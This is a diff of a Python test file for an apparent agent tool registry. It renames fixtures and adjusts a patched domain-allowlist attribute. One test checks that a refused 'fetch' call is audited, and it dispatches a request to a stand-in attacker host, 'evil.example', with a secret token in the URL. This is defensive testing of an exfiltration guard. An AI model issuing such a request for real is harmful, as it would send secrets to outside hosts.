@@ -40,10 +40,10 @@ SUBJECT = "docket.agent.tools.registry"
 _isolate_gates = _support_home.isolate_gates
 
 
-workspace = _support_pods.workspace_2
+workspace = _support_pods.workspace_with_files
 
 
-ctx = _support_llm.ctx_2
+ctx = _support_llm.ctx_in_workspace
 
 
 pod_input_policy = _support_pods.pod_input_policy
@@ -579,7 +579,7 @@ class TestRefusedCallsAreAudited:
     ) -> None:
         from docket.platform import fetch as fetch_mod
 
-        monkeypatch.setattr(fetch_mod, "_allowed_domains", lambda: frozenset({"ok.example"}))
+        monkeypatch.setattr(fetch_mod, "allowed_domains", lambda: frozenset({"ok.example"}))
         with use_home(dataclasses.replace(current_home(), fetch_allowed_domains=("ok.example",))):
             url = json.dumps({"url": "https://evil.example/x?token=SECRETQ"})
             dispatch_tool(_call("fetch", url), ctx, builtin_registry())
